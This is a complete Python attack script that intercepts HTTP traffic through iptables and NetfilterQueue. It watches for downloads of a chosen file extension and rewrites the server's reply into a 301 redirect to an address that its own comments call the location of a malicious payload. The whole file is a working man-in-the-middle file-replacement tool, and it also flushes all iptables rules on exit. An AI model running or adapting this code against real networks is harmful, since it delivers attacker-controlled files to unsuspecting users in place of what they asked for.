#!/usr/bin/env python3

import argparse
import subprocess
import socket
from urllib.parse import urlparse

import netfilterqueue
import kamene.all as scapy


def get_arguments():
    """
    Return the arguments:
    - traffic: Spoof traffic on the [local] machine or [remote] machine
    - domain: Which domain to spoof traffic for
    - queue: The queue number to capture packets for
    """

    # Create parser
    parser = argparse.ArgumentParser()
    parser.add_argument("traffic", choices=["local", "remote"], help="Capture traffic on local or remote machine")
    parser.add_argument("extension", help="Provide a file extension to intercept traffic for")
    parser.add_argument("redirect", help="Address to redirect user to")
    parser.add_argument("-q", "--queue-num", dest="queue", default=0, type=int,
                        help="Provide the queue number to capture packets for")

    # Parse args
    arguments = parser.parse_args()
    return arguments


def queue_local_traffic(queue_number):
    """Capture local traffic to the queue"""
    subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
    subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)


def queue_remote_traffic(queue_number):
    """Capture remote traffic to the queue"""
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)


def reset_ip_tables():
    """Reset IP tables"""
    subprocess.run(["iptables", "--flush"], check=True)


class FileInterceptor:
    """
    FileInterceptor

    This class accepts the extension to monitor for and redirect
    the user to the address with the malicious payload that
    replaces the originally requested payload

    The process_packet method is the callback function to the NFQ.
    """

    def __init__(self, extension, redirect_address):
        self.ack_list = []
        self.extension = extension
        self.redirect_address = redirect_address  # Location of the malicious payload to redirect user to

        # Potentially strip off the port if its in the netloc
        domain = urlparse(self.redirect_address).netloc.split(":")[0]
        self.redirect_ip_address = socket.gethostbyname(domain)

    @classmethod
    def set_packet_load(cls, packet, load):
        packet[scapy.Raw].load = load

        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum

        return packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())

        # Check if the packet has an HTTP Raw layer
        if scapy_packet.haslayer(scapy.Raw):

            # Check if the packet is an HTTP request AND
            #    the packet is not destined for the malicious payload address
            # This prevents an infinite redirection situation
            if scapy_packet[scapy.TCP].dport == 80 and scapy_packet[scapy.IP].dst != self.redirect_ip_address:
                # Safely decode the packet if its part of HTTP traffic
                load = scapy_packet[scapy.Raw].load.decode()

                # Save the ack in case of multiple requests for a file with extension
                if self.extension in load.lower():
                    print(f"[+] Request for {self.extension} file")
                    self.ack_list.append(scapy_packet[scapy.TCP].ack)

            # Check if the packet is an HTTP response
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in self.ack_list:
                    # Remove ack from list
                    self.ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")

                    # Update the load to redirect the user to the new load
                    redirection_load = f"HTTP/1.1 301 Moved Permanently\nLocation: {self.redirect_address}\n\n"
                    modified_packet = self.set_packet_load(scapy_packet, redirection_load)
                    packet.set_payload(bytes(modified_packet))

        packet.accept()


def main(args):
    traffic = args.traffic
    extension = args.extension
    redirect = args.redirect
    queue_number = args.queue

    queue = None
    try:
        if traffic == "local":
            queue_local_traffic(queue_number)
            print(f"[+] Capturing local traffic in Queue {queue_number}.")
        elif traffic == "remote":
            queue_remote_traffic(queue_number)
            print(f"[+] Capturing remote traffic in Queue {queue_number}.")

        # Initialize DNS Spoofer instance with variable content
        file_interceptor = FileInterceptor(extension, redirect)

        # Bind queue
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(queue_number, file_interceptor.process_packet)

        print(f"[+] Successfully binded to Queue {queue_number}")
        queue.run()

    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ..... Resetting IP tables ..... Please wait..")
    except Exception as e:
        print(f"[-] Exception caught: {str(e)} ..... Resetting IP tables ..... Please wait..")
    finally:
        if queue:
            queue.unbind()
        reset_ip_tables()


if __name__ == "__main__":
    args = get_arguments()
    main(args)
